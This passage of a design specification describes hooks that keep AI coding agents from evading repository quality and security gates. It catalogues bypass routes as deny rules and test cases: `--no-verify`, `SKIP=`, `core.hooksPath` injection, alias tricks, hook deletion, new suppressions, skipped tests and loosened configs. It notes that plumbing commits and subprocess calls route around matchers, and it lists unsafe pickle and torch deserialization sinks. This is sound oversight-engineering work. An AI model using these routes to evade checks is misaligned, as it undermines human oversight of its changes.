    - `SKIP=` naming a playbook hook id (strict "any `SKIP=`" is an overlay flag);
    - `PRE_COMMIT_ALLOW_NO_CONFIG=1` and `pre-commit uninstall`;
    - `git -c core.hooksPath=…` and `git config core.hooksPath`;
    - `GIT_CONFIG_*` / `GIT_CONFIG_PARAMETERS` that inject `core.hooksPath` or `alias.*`;
    - `alias.*` whose value contains `--no-verify`, `-n` or `hooksPath`;
    - writes to `.git/hooks/**`.
  - **Asked:** `git commit-tree` and `git update-ref` outside an in-progress rebase.
  - `-m` values and heredoc bodies are skipped.
  - **The reason** renders the ids: `Blocked: this repo's pre-commit hooks (<ids>) must run. Fix what the hook reported (playbook validate && playbook sync, or the metrics regression). If you believe it is a false positive, stop and tell the user.`
- **Implementation.**
  - Builtin handler `block_precommit_bypass`, in the bash branch. It uses §D.2.5's `shell.parse_shell` and `gitargv.parse_git`.
  - It is the **single owner** of `.git/hooks/**` and `core.hooksPath`.
  - Keys read: `precommit.playbook_hook_ids`, the hook's `config.strict_skip`.
- **Budget & failure.** ≤100ms p95, with an early exit for non-git segments. Guard class: an internal error returns `ask` (`deny` headless).
- **Guards.** A narrow flag set, parsed per subcommand. No state. A one-line reason.
- **Portability.** Shell pre-tool in Claude and the OpenCode shim. This is a **speed bump**: plumbing commits, Python `subprocess` calls and scripts get past any argv matcher, which is why the twin is mandatory.
- **Off-workstation twin (mandatory, part of the feature).** `playbook ci` (§F.5) runs `sync --check` (including orphans), `validate`, `metrics`, the secrets scan and the commit-convention step (§F.4) as a **required status check**.
- **Tests.**
  - `git commit --no-verify -m x`: deny. `git commit -nm x`: deny.
  - `git push -n`: none.
  - `git commit -m "fix -n handling"`: none.
  - `SKIP=playbook-metrics git commit`: deny. `SKIP=end-of-file-fixer git commit`: none.
  - `GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.hooksPath GIT_CONFIG_VALUE_0=/dev/null git commit`: deny.
  - `git config alias.ci 'commit --no-verify'`: deny.
  - `rm .git/hooks/pre-commit`: deny.
  - A config with no playbook ids: inactive.
  - A wrapper prefix (`proxy git commit --no-verify`, `proxy` a declared wrapper): deny.

#### gate-weakening-guard — Stage `gate-integrity`: new suppressions, skipped/deleted tests, loosened checker config

`default` · `stop` (stage 4, when the diff versus HEAD is non-empty); companion `pre_tool_use` on Edit|Write of `tests/**`, `**/test_*.py`, `**/*_test.py`, `conftest.py`, and Bash `rm|git rm|mv` of those paths (`handlers: {stop: gate_weakening_guard, pre_tool_use: gate_weakening_guard:pre_edit}`; `on_error: ask`, clamped to `open` on `stop`, §A.2) · `deny`; companion `ask`

- **Behavior.**
  - **Stop scan.** It reads `git diff HEAD -U0` plus untracked non-ignored text files and looks at **added** lines for:
    - `# type: ignore`, `# noqa`, `# pragma: no cover`, `# nosec`, `noqa: S…`;
    - `@pytest.mark.skip`, `skipif(True)`, non-strict `xfail`, `pytest.skip(`;
    - `cast(Any, …)` and new bare `Any` in source roots;
    - `verify=False`;
    - self-service escape pragmas introduced this session (`playbook: allow-secret`, `playbook: trusted-artifact`, from E.4).
  - **Config hunks that loosen gates** (tomllib key diff of HEAD versus the working tree):
    - `[tool.mypy]` `strict`, `ignore_missing_imports`, `exclude`;
    - `[tool.ruff.lint]` `ignore`, `select`;
    - pytest `addopts` `--cov-fail-under`, `filterwarnings`, `xfail_strict`.

    - `[tool.commitizen]` loosening (§F.4): `name` or `schema_pattern` changes, `allowed_prefixes` / `bump_pattern` widening; a change whose direction is unknown counts as loosening.

    This repo sets `strict`, `warn_unused_ignores`, `filterwarnings = ["error"]`, `xfail_strict` and `--cov-fail-under=80` (`pyproject.toml:135-178`). The scan also covers `.pre-commit-config.yaml` hook removals, `.github/workflows/*` step removals and `.gitleaks.toml`.
  - **Justification.** A trailing reason counts as justified, for example `# type: ignore[attr-defined]  # stub gap`.
  - **Output.** Unjustified findings join the combined block once per fingerprint: `Fix the root cause or justify each inline`. Config loosenings and new escape pragmas **always** also reach the user as a note, even when justified.
  - **Pre-edit companion** (`gate_weakening_guard:pre_edit`). It acts only on two things: adding skip or non-strict xfail markers, and deleting test files. Both get `ask` (`deny` headless). The assert-count and expected-literal heuristics are dropped.
- **Implementation.**
  - Builtin handler `gate_weakening_guard`.
  - The scan lives in a pure stdlib module, `coding_agent_playbook/gate_scan.py` *(NEW: `re`, `ast`, `tomllib`, git subprocess)*. It is shared with a new CLI subcommand `playbook gate-scan --range A..B` *(NEW; add to `_SUBCOMMANDS`, `cli.py:37-47`, and its assertion in `tests/unit/test_cli.py`)*.
  - Patterns and protected keys are the hook's `config.{added_line_patterns, protected_config_keys, justification_regex}`, with the consumer layer `[hooks.gate-weakening-guard]` (§B.1). Overlays may only add to the first two (`extend`).
  - Playbook policy config (`.coding-agent-playbook*.toml`) is control-plane-guard's, so nothing is flagged twice.
- **Budget & failure.** About 100ms per Stop with a non-empty diff; 50–100ms per test-file edit. Fails open with a user note.
- **Guards.** Once per fingerprint. Trailing-justification escape. The companion asks only on skip/xfail additions and test deletions.
- **Portability.** The input is git state, so any stop-like event and CI work. The companion runs on Claude and OpenCode (where ask becomes deny with the reason).
- **Off-workstation twin.** `playbook gate-scan --range <merge-base>..HEAD` in CI (part of `playbook ci`), plus an optional pre-commit hook.
- **Tests.**
  - Adding a bare `# type: ignore`: a block line.
  - `# type: ignore[attr-defined]  # stub gap`: none.
  - Lowering `--cov-fail-under`: block plus a user note. A justified loosening: user note only.
  - Edit adding `@pytest.mark.skip`: ask; headless: deny.
  - Same fingerprint, second stop: none.
  - `playbook gate-scan --range HEAD~1..HEAD` exits 1 on the same fixture.

#### tests-with-source-nudge — Stage `tests-nudge`: new public API without a test

`opt-in` · `stop` (stage 9; runs only when stages 0–7 are green and source roots differ from HEAD) · `context`

- **Behavior.**
  - For each changed file under the source roots, it compares `ast` of the working tree against `git show HEAD:<path>` and collects **new** public symbols: top-level functions and classes, and methods of public classes.
  - It skips `_private` and dunder names, `@abstractmethod` / `@override`, and `main`.
  - A new symbol with no word-match under the test roots (`git grep -w -q`) is listed in one line: `New public API without tests: src/x.py::foo`.
  - It is skipped when `last_assistant_message` ends with `?`.
  - Changed (as opposed to new) symbols and the bug-fix keyword escalation are dropped.
  - `[hooks.tests-with-source-nudge] block = true` makes it a `deny` line, which counts against the Stop budget.
- **Implementation.**
  - Builtin handler `tests_with_source_nudge`: stdlib `ast` plus `git grep`.
  - The detector has no source-root or test-root fact (SPEC §8.2), so the roots are derived at sync and baked into the hook's rendered `config.{source_roots, test_roots}`:
    - source roots: `src/` if it exists, else the repo root;
    - test roots: `[tool.pytest.ini_options] testpaths` if set, else `tests/`.
  - At most 20 parsed files per stop.
- **Budget & failure.** 0.1–0.3s, only on Stops with a source diff. Fails open.
- **Guards.** Context only by default. New symbols only. Skipped on questions.
- **Portability.** Git-state input, so any stop-like event works. OpenCode: evidence-only.
- **Off-workstation twin.** §F's `coverage` tool (coverage non-regression in CI) catches untested new code in aggregate. This stage is the per-symbol complement that `--cov-fail-under=80` cannot see.
- **Tests.**
  - Add a public `def public_fn` in `src/` with no test: a context line.
  - Add `_private`: silent.
  - A final message ending in `?`: silent.
  - A test file referencing `public_fn`: silent.
  - `block = true`: a deny line.

#### subagent-stop-verify — Verify an editing subagent's "green" claim inside its own context

`opt-in` · `subagent_stop` · matcher = `agent_type` allowlist (`[hooks.subagent-stop-verify] agent_types`); skipped for subagents whose transcript shows no Edit/Write/Bash-write · `deny`

- **Behavior.**
  - It runs the coordinator engine with the stages `lint` (plus `quality-metrics` when configured, and the execution stages only under the same user-local trust entry). The scope is the touched files, collected from the subagent's Edit/Write inputs, in the subagent's `cwd` (its worktree).
  - If red, it blocks the subagent's stop with trimmed failures, so the fix happens in the subagent's context window instead of the controller's.
  - When `last_assistant_message` claims success while the gate is red or unverified, the reason says the claim contradicts the gate.
  - The catalog's "default-branch HEAD moved during the subagent" report needs a SubagentStart snapshot. `subagent_start` is **not** a canonical event, so this spec compares against the `session_start` snapshot instead (coarser; report-only, never rewrites history). See open questions.
- **Implementation.**
  - Builtin handler `subagent_stop_verify`, reusing the stop-ci-parity-gate engine with a scoped stage list.
  - A stdlib, read-only JSONL parse of `agent_transcript_path`, limited to tool inputs (`file_path` of Edit/Write/MultiEdit).
  - mypy runs are serialized with a lock file in the state dir.
- **Budget & failure.** Seconds per editing-subagent completion; tens of seconds with execution stages. A transcript parse failure fails open, with the user note `NOT verified`.
- **Guards.** Agent-type allowlist. Read-only subagents are skipped. Loop guard: `stop_hook_active` plus a per-`agent_id` counter, max 2. Lock against concurrent mypy.
- **Portability.** Claude only (SubagentStop, `agent_transcript_path`, `agent_type` matcher). Elsewhere, inert; the parent's Stop gate catches the same failures.
- **Off-workstation twin.** The parent session's Stop gate, plus CI.
- **Tests.**
  - A fake transcript with Edit inputs on `a.py` and a stubbed ruff error in `a.py`: deny.
  - An error only in untouched `b.py`: none.
  - A read-only transcript: skipped.
  - Third stop: none, plus a note.
  - `agent_type` outside the allowlist: not dispatched.

#### prompt-output-contract-on-stop — Stage `output-contract`: the active prompt's declared output contract

`opt-in` · `stop` (stage 8) · active only while the session's active playbook prompt declares an `output_contract` · `context` (deny-once configurable)

- **Behavior.**
  - It applies the active prompt's contract regexes to `last_assistant_message` only, capped at the last 4,000 characters. It **never** reads `transcript_path`, which holds the whole session in an internal format.
  - On a miss it adds a context line by default. `[hooks.prompt-output-contract-on-stop] block_once = true` makes it a deny line within the coordinator's budget.
  - **Proposed contracts for shipped prompts:**
    - `review` and `security-review`: a final verdict line, `(?im)^\W*(verdict\W*)?(approve with comments|approve|request changes)\W*$`. These are their documented "Output format" sections (`review.md.j2:52`, `security-review.md.j2:39`).
    - `find-injected-vulnerability`: `(?i)\bCWE-\d+\b|no (reachable|exploitable)`. The prompt asks for the CWE, or a plain "no chain" conclusion.
- **Implementation.**
  - Builtin handler `prompt_output_contract_on_stop`.
  - The active prompt comes from the user_prompt_submit active-prompt record (shared with prompt-write-scope-guard, E.3) and `prompts.<slash>.output_contract`.
  - **New optional frontmatter field** `output_contract: list[str]` on `PromptFrontmatter` (`types.py:128`) *(NEW)*. It needs the `__post_init__` None-coercion, the §6.6.3 round-trip update and the agent_harness sidecar fields (§A.7).
  - It is compiled at `playbook validate`, fail-closed at construction like `AnswerMatchesCheck` (`evaluators/checks/answer.py:48`), with a capped input. One pattern source serves both live checks and authors of the prompt's eval `answer_matches` gates.
- **Budget & failure.** Under 10ms. Fails open.
- **Guards.** Context by default. `last_assistant_message` only. Shares the Stop budget.
- **Portability.** It needs `last_assistant_message` (Claude Stop). It is inactive on OpenCode, whose `session.idle` payload carries no message text.
- **Off-workstation twin.** The prompt's eval tasks: `answer_matches` gates in `playbook eval <id> --run`, for example `names_class` in `find-injected-vuln-pytorch-deserial/task.toml`.
- **Tests.**
  - Active `/review` with a final message lacking a verdict line: a context line.
  - `Verdict: approve`: silent.
  - The transcript file is never opened (spy on `open`).
  - No active prompt: inert.
  - An invalid regex in `output_contract`: a `playbook validate` failure.

### E.1/E.2 open questions and flagged divergences

The authoritative, deduplicated list is §K; these are its E.1/E.2 sources.

1. **Child processes instead of in-process imports (L3).** `commands.validate`, `commands.eval`, `commands.check`, `orchestrator` and `renderer` import jinja2 (verified). validate-then-sync, the eval `--show` echo and the rendered-rule injection therefore run `playbook …` as child processes on the pinned interpreter, at +0.4–0.7s per (rare) canonical edit. This is a deliberate deviation from the catalog's "in-process lazy import". The alternative is to relax L3 to "never on the hot path".
2. **`subagent_start` is not canonical.** The catalog's SubagentStart HEAD snapshot (subagent-stop-verify) and the opt-in SubagentStart briefing variant need it. Option A: add `subagent_start` as a Claude-only canonical event. Option B (assumed here): drop both and compare against the `session_start` snapshot.
3. **Stop on OpenCode** is evidence-only (state plus next-turn `experimental.chat.system.transform`), because `session.idle` cannot block (#16626). An SDK re-prompt is rejected until loop re-entry ships. This depends on an `experimental.*` API (L5 open question on V2).
4. **Prerequisites beyond L7.** *Resolved*: both are in Track P (P8 validate-gated sync + config-less validate; P2(b) `copytree` hardening).
5. **`[metrics] run_tests = true` executes the suite from `playbook metrics`.** *Resolved* by §F.0.3 item 6: both `playbook-metrics` pre-commit entries gain `--no-run-tests`.
6. **Heartbeat line in `.claude/CLAUDE.md`.** It changes CLAUDE.md bytes when hooks are enabled, so the consumer gets drift once on upgrade and must re-sync. AGENTS.md is untouched.
7. **SPEC.md:141** ("avoid `{% if %}` inside rule bodies") contradicts shipped `.md.j2` rules: `00-project-context`, `typing`, `pytest` and `serialization-security` use it. validate-then-sync does not enforce the rule. Should the SPEC be amended?
8. **Fixture integrity mechanism** (guard-eval-fixtures twin). Either a per-task content hash in `task.toml` (a schema change, §6.5.3), or a CI diff of `eval_tasks/*/setup/**` against the merge base.
9. **`playbook ci` ownership.** *Resolved*: §F.5 owns it.
10. **Citation fix for other drafters.** The catalog cites "SPEC 19 Q8" as the guardrail-self-protection practice for control-plane-guard. SPEC §19 Q8 is OpenCode plugin generation, so this section does not cite it.
11. **The `[hooks]` master switch.** *Resolved*: §B.1 defines it (absent table, or a table without `enabled`, ⇒ off).
12. **Claude `ConfigChange` hook.** Register a Claude-only `ConfigChange` hook (matcher `project_settings|local_settings|user_settings|skills`)? Exit 2 or `decision: "block"` there stops new settings from applying (except `policy_settings`), closing the window between a Bash write to `settings.json` and the next guard. It is silent (debug log only), so it would pair with a `systemMessage` on the next event. `ConfigChange` is not a canonical event, so this needs either a Claude-only canonical event or an adapter-level registration.

### Notation used in E.3–E.5

- **Decisions** are the canonical four: `deny | ask | context | none` (L6). Catalog actions map as in §E.0.3: `block → deny`, `warn → context`, `inject_context → context`, `log → none`, `auto_fix → none` (a silent side effect on the edited file; `context` only when diagnostics remain). Ask degradation (principle 5) applies everywhere and is not repeated per entry: `ask` becomes `deny` headless and on OpenCode (plugins can only throw).
- **`gc:`** prefixes a key in the sync-rendered `guard_config.json`: `gc:shared.*` holds machine-independent tables used by several hooks, `gc:<hook-id>.*` is shorthand for that hook's merged `config` (`hooks.<hook-id>.handlers.<event>.config`, §A.7), whose consumer layer is `[hooks.<hook-id>]` (§B.1). All keys below are **(shared name — proposed)** unless another section defines them first. Absolute paths and stat signatures never appear under `gc:` (§D.8.3).
- **`<state>`** is the per-worktree private state dir `$(git rev-parse --git-path playbook-hooks)` (mode 0700, principle 11). "Once per session" means a dedupe entry under `<state>` keyed by `session_id`.
- **`<ruff>`** (and `<cz>`) is the absolute tool path pinned per worktree in `machine.json` with its stat signature (§D.8.3), never in `guard_config.json`.
- **NEW modules** (stdlib-only, import-light — never `cli.py`, `jinja2`, `yaml`, `packaging` or `detector.py`, which imports `packaging` at detector.py:14-15, except per §D.1's branch-local rows): builtin handlers under `src/coding_agent_playbook/hook_runtime/handlers/`; the shell, git-argv and path parsers are **§D's** (`hook_runtime/shell.py`, `gitargv.py`, `paths.py`), and this section adds only `hook_runtime/_hosts.py`, `_ruff.py` and `gitargv.commit_message_sources`; the policy/scanner library lives under `src/coding_agent_playbook/security/` (importable by both the dispatcher and new CLI subcommands). Handler names follow §A.2 (snake_case, shareable, `<name>:<role>` companions bound through `handlers`). Paths are **(shared name — proposed)**.
- **Labels** follow principle 13: **boundary** = a decision on a structured tool payload that the harness enforces; **speed bump** = shell-string matching the same-UID agent can route around; **detective** = state-based check after the fact; **n/a** = advisory feedback, not a control. Even a boundary fails open in Claude Code on a missing interpreter or timeout unless the overlay strict mode renders `onFailure: "block"` with `--strict-launch` (Claude Code >= 2.1.295, verified; used only by the overlay PII guard, see E.5 and QC-11), which is why every guard has a native twin where one exists.
- **Tests** live under `tests/hooks/` (pack hooks) and `tests/security/` (the library), driven through `playbook-hook simulate <event>` with golden payloads from the one fixture root `tests/fixtures/hook_payloads/<harness>/<event>/<case>.json` (§D.9); external binaries go through named fakes (`FakeRuff`, `FakeGit`, `FakeCz`) injected through `RuntimeDeps.proc` (`FakeProc`, autouse; §D.9) (memory: uv-shell-out-needs-test-stub).
- **New CLI subcommands** named in this section (`scan-secrets`, `scan-sinks`, `check-deps`, `check-commit-trailers`, `check-notebooks`; all off-workstation twins, all stdlib) extend `_SUBCOMMANDS` (cli.py:37-47), whose exact set `tests/unit/test_cli.py` asserts; each is also a `playbook ci` step where noted. Every track that adds or edits a `.pre-commit-hooks.yaml` id updates `tests/integration/test_precommit_hooks_yaml.py` in the same change (its `expected` id set at `:65` and the exact `playbook-metrics` entry string at `:51`); `config.yaml.j2` additions keep `language: system` (asserted at `tests/integration/test_precommit_template.py:36`).
- **Tool names**: Claude Code's current tools reference lists `Edit`, `Write`, `NotebookEdit` and no longer lists `MultiEdit`; matchers below include `MultiEdit` only as a tolerated legacy name (the §A.2 `edit` class). OpenCode names are translated by the L5 shim (`bash→Bash`, `edit→Edit`, `write→Write`, `read→Read`, `glob→Glob`, `grep→Grep`, `webfetch→WebFetch`, `websearch→WebSearch`; `filePath→file_path`, `oldString→old_string`, `newString→new_string`, `replaceAll→replace_all`); `apply_patch` is passed through unsplit and its `*** … File:` headers are parsed by the §D.2.2 normalizer; MCP and plugin tools are **not** forwarded on OpenCode (§C.3.3), so the `mcp` class is degraded there.

### E.3 Rule-linked edit feedback

Eight hooks that turn the rule pack's Python conventions into per-edit feedback. Four of them (post-edit-ruff-format and the three rule-linked lint hooks), together with clean-code-metrics-nonregression's post-edit companion (§E.2) and §F's docstring hook, share **one** diagnostics invocation of ruff per edited file; the other four (ml-unsafe-deserialization-guard, prompt-write-scope-guard, toolchain-missing-hint and opt-in notebook-output-hygiene) ride the same dispatcher processes without ruff.

#### Shared: the post-edit pipeline and the single ruff invocation

One `post_tool_use` registration (L3), matcher `Edit|Write|NotebookEdit` (`MultiEdit` tolerated). Per edited file, in-process, in this order:

1. **Eligibility.** `realpath` inside the repo root; not matching `gc:shared.secret_path_globs` or `gc:shared.fixture_excludes` (default `**/eval_tasks/*/setup/**`, covering both `src/coding_agent_playbook/resources/eval_tasks/*/setup/` and a consumer's `playbook/eval_tasks/`); suffix `.py` or `.pyi`. Anything else skips all ruff work (`.md` is never formatted: ruff's markdown formatting is preview behavior and already broke this repo's CI, memory ruff-format-md-ci-blocker).
2. **Pin check.** `os.stat(<ruff>)` must equal `machine.json` `tools.ruff.sig` (§D.8.3); on mismatch (e.g. the agent overwrote `.venv/bin/ruff`) all ruff work is skipped with one `systemMessage` per session: "ruff changed since the last `playbook sync`; post-edit checks skipped until it is re-pinned." The pin is resolved at every write-mode sync: the project venv's ruff first (version parity with the project's pin; `.venv/bin/ruff`, `.venv\Scripts\ruff.exe`), else `shutil.which("ruff")`. Never `uv run` (L8).
3. **HEAD blob.** One `git cat-file --batch` fed `HEAD:<rel>`; yields `(oid, text)` or "missing" (new/untracked file).
4. **Mutations** (post-edit-ruff-format only; see its entry): M1 `<ruff> check --fix-only --force-exclude --select <gc:shared.ruff.safe_fix_select> --unfixable F401,F841,F811 -- <path>`, then M2 `<ruff> format --force-exclude -- <path>` (lint fixes first, then formatting, so the formatter has the last word).
5. **D1 — the one diagnostics invocation**, memoized per `(path, content sha256)` for the event so whichever handler asks first runs it and the others reuse it:
   ```
   <ruff> check --no-fix --exit-zero --force-exclude --output-format json \
          --extend-select <U> -- <path>
   ```
   `U` is the sorted union of `gc:shared.lint_buckets[<hook-id>]` over the hooks that are enabled **and** applicable to `<path>` (their own path filters). `--extend-select` keeps the project's own `select`/`ignore`/`per-file-ignores`/`# noqa`, so project intent wins; `--force-exclude` keeps project excludes effective for an explicitly passed path (P9). When the quality bucket is in `U`, D1 also carries the `--config` overrides rendered at sync from `[metrics.ruff_violations] config` (§F.2.1; e.g. `lint.mccabe.max-complexity=…`, `lint.pylint.max-returns=…`, `max-branches`, `max-args`, `max-statements`), each **omitted** when the project itself selects that code, because the override would also change the threshold of the project's own CI-failing rule. Preview rules (PLR1702, the DOC* pydoclint port) are never enabled globally: an opted-in hook gets one separate per-invocation `--preview --select <codes>` call (addendum D-Q1). If no consumer is enabled, D1 does not run; if only post-edit-ruff-format is enabled, `U` is empty and D1 reports the project's own selection.
6. **Changed lines.** `difflib.SequenceMatcher` over HEAD text vs the post-mutation on-disk text; inserted/replaced lines of the new file. A missing HEAD blob means every line is changed. Diagnostics outside the set are dropped (legacy code is never flooded; "keep changes minimal" is respected).
7. **Partition, cap, dedupe, emit** (table below), then one combined `context` decision for the event.

| Bucket (first match wins) | Codes | Extra filter | Line prefix |
| --- | --- | --- | --- |
| `post-edit-ruff-format` | code selected by the project (`gc:shared.ruff.project_select` minus `project_ignore`, prefix-aware, rendered at sync from `[tool.ruff.lint]` in `pyproject.toml` / `ruff.toml`; ruff defaults when absent) plus syntax errors (JSON `code: null`) | none | `ruff (CI fails on this):` |
| `error-handling-lint-feedback` | `python-error-handling` `lint_codes` | `S101` dropped under `tests/**` | `rule python-error-handling:` |
| `typing-lint-feedback` | `python-typing` `lint_codes` (+ its `when` blocks) | not `tests/**`, not `*.pyi`; `ANN001`/`ANN201` only on public defs; ANN dropped when the Stop mypy tier is on | `rule python-typing:` |
| `pytest-conventions-feedback` | `pytest` `lint_codes` | path matches `tests/**/*.py` | `rule pytest:` |
| `clean-code-metrics-nonregression` (post-edit companion, §E.2) | C901, PLR0911, PLR0912, PLR0913, PLR0915 (addendum D-Q1) | changed lines; a def counts only when new or its signature line changed | `quality:` |
| `docstring-nonregression` (post-edit, §F.3) | D100–D107 via the `python-docstrings` rule's `lint_codes` (§F.3) | not `tests/**`; a def counts only when new or its signature line changed | `rule python-docstrings:` |

A code that is both project-selected and claimed by a rule lands in bucket 1 with ` (rule <id>)` appended, so the model learns both "CI fails" and "why". If `post-edit-ruff-format` is disabled, project-selected codes that no rule claims are dropped. **Caps**: at most 5 lines from bucket 1 and at most 8 lines in total per event, bucket 1 first, then by line number. **Dedupe**: key `sha256(rel, code, stripped source line)` in `<state>` (line numbers shift between edits; the line text does not). Output line: `<rel>:<line> <code> <message>` plus the bucket prefix; the rule *section text* is not quoted (it would blow the 8-line cap; the rule itself is already in context via CLAUDE.md/AGENTS.md).

**`lint_codes` — RuleFrontmatter field.** The schema is defined once in §A.7 (this is that shape). `RuleFrontmatter` (types.py:56-65) gains `lint_codes: dict[str, Any] = field(default_factory=dict)`, None-coerced in `__post_init__` like the existing fields (types.py:67-81) and dropped by `_without_empty` (types.py:45-47) when empty, so every existing rule round-trips byte-identically (SPEC §6.6.3); the agent_harness sidecar carries it (§A.7). Shape:

```yaml
lint_codes:
  warn: [ANN001, ANN201, ANN401, B006, PGH003, UP007, UP045]
  when:
    - applies_if: {python_version: ">=3.12"}
      warn: [UP040, UP046, UP047]
```

`when[].applies_if` is evaluated **at sync** by `detector.evaluate_predicate` (detector.py:386) against the same facts the rule body uses; the hook never evaluates predicates at run time (it cannot import `detector.py`). At sync, codes are also filtered against the pinned ruff: one `<ruff> rule --all --output-format json` per ruff signature drops unknown codes and preview-only codes (preview is never enabled globally; per-invocation opt-in only, D-Q1); the filtered lists become `gc:shared.lint_buckets`. A rule-linked hook inherits its rule's `applies_if` and `globs`: if the rule is filtered out at sync, the hook is not rendered.

#### post-edit-ruff-format — Format only already-clean files, safe autofixes only, CI-relevant lint fed back

`default` · `post_tool_use` · `Edit|Write|NotebookEdit` on `**/*.py`, `**/*.pyi` inside the repo root · auto_fix → `none` (`context` only when bucket-1 diagnostics remain) · label: n/a (quality; the only E.3–E.5 hook with a working-tree side effect)

**Behavior.** Anti-churn eligibility for M1/M2: the file is new/untracked, or its HEAD blob is format-clean per `<ruff> format --check --force-exclude --stdin-filename <rel> -` fed the HEAD text; the result is cached in `<state>` keyed by blob `oid`, so it is computed once per blob, not per edit. A legacy unformatted file is never reformatted, only reported. M1 fixes only `gc:shared.ruff.safe_fix_select` = `{I, UP}` ∩ project select (computed at sync; no hardcoded second style source). `F401`/`F841`/`F811` are never fixed (`F` is outside the allowlist and is also passed to `--unfixable`): the agent often adds an import in one Edit and its first use in the next, and an autofix would delete the import in between. Then bucket-1 diagnostics on changed lines are reported. Silent on success; no "re-read the file" message.

**Implementation.** Handler `ruff_post_edit` (`hook_runtime/handlers/ruff_feedback.py`, NEW) on the shared pipeline; `hook_runtime/_ruff.py` (NEW) owns `RuffPin`, `run_ruff(args, *, stdin, timeout_s) -> CompletedProcess`, `ruff_diagnostics_for(path, codes) -> list[RuffDiagnostic]` (the D1 memo) and `changed_lines(head_text, new_text) -> set[int]`. Keys: `gc:shared.ruff.{version,project_select,project_ignore,safe_fix_select}` (machine-independent; the ruff path and stat signature are `machine.json` `tools.ruff`), `gc:post-edit-ruff-format.{safe_fix_allowlist=["I","UP"], max_project_lines=5}`. The handler registration declares a `mutates_edited_file` capability **(shared name — proposed)** that `playbook validate` allows only for builtin handlers, never for external-command handlers (an extension of the L6 trust contract: no hook may write anything except the file the tool just edited, and only builtins may do even that).

**Budget & failure mode.** 50-150 ms per `.py` edit (cat-file ~5 ms, M1+M2 ~15-30 ms each, D1 ~20-40 ms); 2 s timeout per subprocess. `on_error: open` — ruff missing, pin mismatch, timeout or parse error skips with one `systemMessage` per session; never blocks.

**Guards.** Idempotent (re-running on a formatted file is a no-op); clean-at-HEAD only; changed lines only; 5/8 caps; per-session dedupe; never fixes unused-import/variable codes; secret-glob, fixture-excluded and out-of-repo paths are skipped.

**Portability.** Claude `PostToolUse` → `hookSpecificOutput.additionalContext`. OpenCode `tool.execute.after` → the shim appends the text to the tool output the model sees (the after-hook cannot block but may append; it does not fire when the tool throws). Cursor/Codex/Continue: no shim (principle 16); AGENTS.md advisory paragraph only.

**Off-workstation twin.** Already exists: the init starter's `ruff` / `ruff-format` entries (`resources/precommit/config.yaml.j2`) and CI's `ruff check .` + `ruff format --check .`. The hook moves the most common CI failure to the moment of the edit.

**Tests.** `tests/hooks/test_ruff_feedback.py` with `FakeRuff` (records argv, returns scripted JSON) and a tmp git repo: clean-at-HEAD file gets M1+M2; unformatted-at-HEAD file is untouched and gets a diagnostic; an Edit adding only `import os` keeps the import (assert no M1 argv selects `F`); 7 diagnostics → 5 reported; same diagnostic twice → once; pin mismatch → skip + one note; `.md` edit → no subprocess; with all five consumers enabled exactly **one** D1 argv is recorded per event (the shared-call invariant).

#### ml-unsafe-deserialization-guard — Block new unsafe deserialization sinks before they hit disk

`default` · `pre_tool_use` · `Edit|Write|NotebookEdit` (`MultiEdit` tolerated) on the linked rule's globs (`**/*.py`) plus notebook code cells, minus `gc:shared.fixture_excludes` · block → `deny` / `ask` / `context` · `linked_rule: ml-serialization-security` (inherits `applies_if: {any_ml_stack: [...]}`, `src/coding_agent_playbook/resources/rules/ml/serialization-security.md.j2:9-10`) · label: **boundary** for structured writes; Bash-written sinks: **detective** (Stop rescan warn)

**Behavior.** Builds the post-image in memory: `Write.content`; `Edit` = current on-disk text with `old_string → new_string` (`replace_all` honored); `NotebookEdit` = the cell's `new_source` against that cell's current source; OpenCode `apply_patch` hunks via the shim. Parses pre- and post-image with `ast.parse` and collects sink call sites as a multiset of `(dotted callee resolved through import aliases, frozenset(literal kwargs))`; only `post − pre` counts, so existing sinks the edit leaves alone pass.
- `deny` (reason <= 3 lines: the safe API and the escape): `pickle.load(s)`, `dill.load(s)`, `shelve.open`, `joblib.load`, `pandas.read_pickle`; `yaml.load` without `Loader=SafeLoader|CSafeLoader`; `torch.load(..., weights_only=False)`; `np.load(..., allow_pickle=True)`; any call with `trust_remote_code=True`.
- `context`, once per pattern per file per session: bare `torch.load(p)` / `np.load(p)` (their default depends on the installed version, and the detector records version constraints, not installed versions), `from_pretrained` without `revision=`, `eval` / `exec`, `os.system`, `subprocess.*(..., shell=True)`.
- Escape `# playbook: trusted-artifact <provenance>` on the call line or the line above: present at HEAD → allow; newly written → `ask` (the human confirms provenance; a self-written escape comment is self-authorization) and listed by gate-weakening-guard (E.2) through `gc:shared.weakening_pragmas`.
- Post-image does not parse → regex fallback over the new text only (`new_string` / `content`) with the same table.
- Bash writes have no pre-write payload: the Stop coordinator's security tier (shared with stop-diff-sweep, E.4) rescans diff `.py` files with the same visitor, NEW vs HEAD, and adds one warn line to the combined Stop message, never a separate block.

**Implementation.** Handler `deser_sink_guard` (`hook_runtime/handlers/deser.py`, NEW), an `ast.NodeVisitor`; no ruff call (ruff's `S301`/`S506` cover pickle and `yaml.load` but nothing covers `torch.load`, `np.load(allow_pickle=True)` or `trust_remote_code`). The sink table is data in the hook's frontmatter `config.block` / `config.warn`, rendered to `gc:ml-unsafe-deserialization-guard.{block,warn}` only when the linked rule survives `applies_if`. A rule-level `hook_patterns:` field is deferred to its own spec (it changes `RuleFrontmatter` and the §6.6 round-trip).

**Budget & failure mode.** One or two `ast.parse` (~10-50 ms), <= 100 ms p95 inside the shared pre-tool dispatcher, only in ML-detected repos. `on_error: ask`; a parse failure is not an error (regex fallback).

**Guards.** NEW sinks only; warns deduped per session; pragma honored only at HEAD; silent in non-ML repos and in eval fixtures (the engine's own `find-injected-vuln-pytorch-deserial` fixture deliberately contains these sinks).

**Portability.** Claude `PreToolUse` `permissionDecision`; OpenCode `tool.execute.before` (throw). Harnesses without pre-write payloads: the Stop rescan (Claude only) and the twin.

**Off-workstation twin.** `playbook scan-sinks [--staged | --range A..B]` **(NEW; shared name — proposed)**: the same visitor with NEW-vs-base counting, exposed as an opt-in `repo: local` pre-commit entry and as a `playbook ci` step.

**Tests.** `tests/hooks/test_ml_unsafe_deserialization_guard.py`, ML-detected fixture repo: `pickle.loads(data)` added → deny; `torch.load(p, weights_only=True)` → none; bare `torch.load(p)` → context once; `eval(x)` → context; unchanged existing `pickle` call → none; `import pickle as pk; pk.loads(x)` → deny (alias resolution); new trusted-artifact pragma → ask, pragma at HEAD → none; NotebookEdit code cell with `np.load(f, allow_pickle=True)` → deny; edit under `eval_tasks/*/setup/` → inactive; non-ML repo → not rendered.

